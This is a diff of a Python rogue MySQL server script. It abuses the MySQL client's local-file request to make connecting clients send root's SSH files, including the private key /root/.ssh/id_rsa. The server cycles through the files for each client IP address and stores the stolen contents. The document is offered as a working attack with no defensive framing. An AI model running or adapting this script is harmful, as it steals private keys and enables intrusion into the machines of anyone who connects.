@@ -4,7 +4,10 @@ import binascii
 import struct
 import os
 from threading import Thread
+from pwn import *
+from time import *
 
+info = {}
 
 def rand_str(num):
     up = "FF" * num
@@ -22,14 +25,14 @@ class mysql:
         self.addrress = addrress
         self.port = port
         self.count = count
-        self.file = file
+        self.files = ['/root/.ssh/known_hosts', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub']
     def start(self):
         ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ss.bind((self.addrress, self.port))
         ss.listen(self.count)
         while True:
             conn, addr = ss.accept()
-            t = Thread(target = self.main, args = (conn, addr))
+            t = Thread(target = self.main, args = (conn, addr[0]))
             t.start()
 
 
@@ -64,39 +67,40 @@ class mysql:
 
         return length + pck_num + ok
 
-    def attack(self):
+    def attack(self, filename):
         pck_num = b"\x01"
 
         num_field = b"\xfb"
-        payload = self.file.encode()
+        payload = filename.encode()
 
         data = num_field + payload
         length = struct.pack("i", len(data))[:3]
 
         return length + pck_num + data
     def main(self, conn, addr):
-        # try:
-            data = self.greet()
-            # print(str_hex(data))
-            conn.send(data)
-            conn.recv(1024)
-            data = self.resp_ok()
-            # print(str_hex(data))
-            conn.send(data)
-            conn.recv(1024)
-            data = self.attack()
-            # print(str_hex(data))
-            conn.send(data)
-            print("*" * 88)
-            print("addr: ", addr)
-            print(conn.recv(1024))
-            print("*" * 88)
-            conn.close()
-        # except Exception as e:
-        #     print("*" * 88)
-        #     print("addr: ", addr)
-        #     print(e)
-        #     print("*" * 88)
+        fileNum = 0
+        if addr in info.keys():
+            fileNum = len(info[addr]) % 3
+        filename = self.files[fileNum]
+        data = self.greet()
+        conn.send(data)
+        conn.recv(1024)
+        data = self.resp_ok()
+        conn.send(data)
+        conn.recv(1024)
+        data = self.attack(filename)
+        conn.send(data)
+        print("*" * 88)
+        print("addr: ", addr)
+        print("filename ", filename)
+        data = conn.recv(10240)
+        if fileNum == 0:
+            info[addr] = []
+        info[addr].append({filename:data})
+        print(data)
+        print("*" * 88)
+        conn.close()
+        print(info)
 
 
 if "__name__" == "__main__":
